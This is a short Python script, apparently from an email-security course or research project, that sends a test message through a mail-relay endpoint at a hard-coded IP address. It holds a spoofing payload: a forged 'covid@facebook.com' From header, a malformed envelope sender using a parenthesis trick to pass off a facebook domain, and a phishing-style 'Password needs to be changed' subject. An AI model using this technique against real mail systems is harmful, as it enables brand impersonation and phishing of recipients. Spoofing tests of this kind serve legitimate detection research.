import requests
import json
from config import *
url="http://167.99.0.42:3000/sendemail"

defaults={
"helo":"postal.pujanpaudel.net",
"dkim_domain":"pujanpaudel.net",
"dkim_subdomain":"postal-IZOG0a",
"smtp_mailfrom":"omlkfo@rp.postal.pujanpaudel.net"
}
#any@facebook.com(.pujanpaudel.net
test_list_v2={
"Normal1": {
        "mailfrom":"any@facebook.net(postal.pujanpaudel.net",
        "rcptto": "EC700emailtesting2@gmail.com",
         "data": {
            "from_header": "covid@facebook.com",
            "to_header": "EC700emailtesting@gmail.com",
            "subject_header":"Password needs to be changed",
            "body": "ML classifier should be able to detect this pretty easily!",
        },
	"dkim_d":defaults['dkim_domain'],
	"dkim_s":defaults['dkim_subdomain'],
         "starttls": True,
    },
}


import urllib.request


for item in test_list_v2:
	attackbody={
	"from":test_list_v2[item]["data"]["from_header"],
	"to":test_list_v2[item]["rcptto"],
	"subject":test_list_v2[item]["data"]["subject_header"],
	"message":test_list_v2[item]["data"]["body"],
	"sender":"",
	"dkim_d":defaults["dkim_domain"],
	"dkim_s":defaults["dkim_subdomain"],
	"mail_from":test_list_v2[item]["mailfrom"],
	"resentsender":"resent_sender"
}
	print(attackbody)
	req = urllib.request.Request(url)
	req.add_header('Content-Type', 'application/json; charset=utf-8')
	jsondata = json.dumps(attackbody)
	jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
	req.add_header('Content-Length', len(jsondataasbytes))
	response = urllib.request.urlopen(req, jsondataasbytes)
	break
